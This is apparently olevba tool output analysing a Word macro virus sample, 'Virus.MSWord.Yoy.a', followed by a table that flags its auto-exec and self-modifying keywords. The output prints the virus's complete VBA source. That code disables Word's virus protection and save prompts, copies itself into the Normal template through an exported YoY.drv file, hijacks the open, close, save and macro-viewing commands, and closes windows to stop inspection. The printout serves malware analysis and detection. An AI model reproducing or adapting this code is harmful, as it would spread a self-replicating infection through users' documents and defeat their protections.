olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Yoy.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Yoy.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO YoY.bas 
in file: Virus.MSWord.Yoy.a - OLE stream: 'Macros/VBA/YoY'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Macro.YoY virus by AlEkS
Sub YoY()
 On Error Resume Next
 If (Dir(Word.Application.Path + "\~.~") = "") Then
      Options.VirusProtection = False
Application.Caption = "YoY"
    Options.ConfirmConversions = False

    Options.SaveNormalPrompt = False

  path_1 = Word.Application.Path + "\YoY.drv"

     Call expo_
           Set per_2 = ActiveDocument.VBProject.VBComponents
     Set per_1 = NormalTemplate.VBProject.VBComponents

     ActiveDocument.ReadOnlyRecommended = False
        With Dialogs(wdDialogFileSummaryInfo)
          .Title = "Little YoY"
          .Execute
        End With
    If Left(Date, 2) = "17" Or Left(Date, 2) = "05" Then Call Msg
    If ActiveDocument.VBProject.VBComponents.Item("YoY").Name <> "YoY" Then AD = True
    If NormalTemplate.VBProject.VBComponents.Item("YoY").Name <> "YoY" Then NT = True

    If NT = False And AD = True Then Set imp_ = per_2
    If NT = True And AD = False Then Set imp_ = per_1


       imp_.import path_1

    If AD = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save

 End If
End Sub
Sub expo_()
 On Error Resume Next
 ActiveDocument.VBProject.VBComponents("YoY").Export (Word.Application.Path + "\YoY.drv")
End Sub

Sub AutoOpen()
 On Error Resume Next
 Call YoY
End Sub

Sub AutoNew()
 On Error Resume Next
 Call YoY
End Sub

Sub AutoClose()
 On Error Resume Next
 Call YoY
End Sub

Sub FileSaveAs()
    On Error Resume Next
    Dialogs(wdDialogFileSaveAs).Show
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub

Sub FileSave()
    On Error Resume Next
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub

Sub FileTemplates()
 On Error Resume Next
 Call YoY
 Call Koy
End Sub

Sub ToolsMacro()
 On Error Resume Next
 Call YoY
 Call Koy
 Call Msg
End Sub

Sub ViewVBCode()
 On Error Resume Next
 Call YoY
 Call Koy
 Call Msg
End Sub

Sub Koy()
 On Error Resume Next
 ActiveWindow.Close SaveChanges:=SaveChanges
End Sub

Sub Msg()
On Error Resume Next
MSGbox "!Love YoY? Yes! Please don't panic! Write me top_100@mail.ru!"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

